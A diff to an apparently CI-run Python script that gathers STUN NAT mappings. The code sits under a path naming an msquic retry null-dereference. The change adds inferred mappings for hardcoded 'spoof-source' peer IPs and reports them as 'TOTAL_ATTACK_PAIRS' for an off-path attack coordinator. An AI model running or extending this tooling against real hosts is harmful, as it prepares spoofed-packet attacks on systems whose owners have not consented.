@@ -91,10 +91,48 @@ for name, ip, port in SERVERS:
 
 if not mappings:
     raise SystemExit("FAIL: no STUN server returned a matching response")
-result = {"run_id":os.environ.get("GITHUB_RUN_ID",""),"local_port":LOCAL_PORT,"mappings":mappings,"failures":failures}
+
+# Where the same still-open socket receives the same public IP:port from
+# multiple independent STUN peers, test the endpoint-independent mapping
+# hypothesis against CAIDA-confirmed spoof-source peers too. The target did
+# send an outbound datagram to each of those exact peer tuples, creating
+# outbound state; these inferred entries are explicitly labeled.
+observed_maps = {(row["mapped_ip"], row["mapped_port"]) for row in mappings}
+inferred = []
+if len(observed_maps) == 1:
+    common_ip, common_port = next(iter(observed_maps))
+    for failure in failures:
+        if failure.get("error") != "timeout/no-matching-success":
+            continue
+        dest = failure.get("dest", "")
+        if ":" not in dest:
+            continue
+        peer_ip, peer_port = dest.rsplit(":", 1)
+        if peer_ip not in {"192.172.226.159", "6.1.2.3", "13.105.101.55", "13.105.116.55", "13.105.125.55"}:
+            continue
+        inferred.append({
+            "name": failure.get("name", "CAIDA-confirmed-source"),
+            "peer_ip": peer_ip,
+            "peer_port": int(peer_port),
+            "mapped_ip": common_ip,
+            "mapped_port": common_port,
+            "local_port": LOCAL_PORT,
+            "mapping_basis": f"inferred: identical endpoint-independent mapping observed across {len(mappings)} successful STUN peers",
+            "no_stun_reply": True
+        })
+mappings.extend(inferred)
+result = {
+    "run_id":os.environ.get("GITHUB_RUN_ID",""),
+    "local_port":LOCAL_PORT,
+    "confirmed_stun_mappings":len(mappings)-len(inferred),
+    "inferred_caida_source_mappings":inferred,
+    "mapping_endpoint_independent_observed":len(observed_maps)==1,
+    "mappings":mappings,
+    "failures":failures
+}
 pathlib.Path("offpath-fixed-results").mkdir(parents=True,exist_ok=True)
 pathlib.Path("offpath-fixed-results/mappings.json").write_text(json.dumps(result,indent=2)+"\n")
-print(f"STUN_PEERS_CONFIRMED={len(mappings)} FAILURES={len(failures)}",flush=True)
+print(f"STUN_PEERS_CONFIRMED={len(mappings)-len(inferred)} INFERRED_CAIDA_PEERS={len(inferred)} TOTAL_ATTACK_PAIRS={len(mappings)}",flush=True)
 os.system("python3 security-research/msquic-v2-retry-null-deref/nettest-coord.py publish exact-fixed-stun-mappings offpath-fixed-results/mappings.json")
 
 sock.settimeout(1)
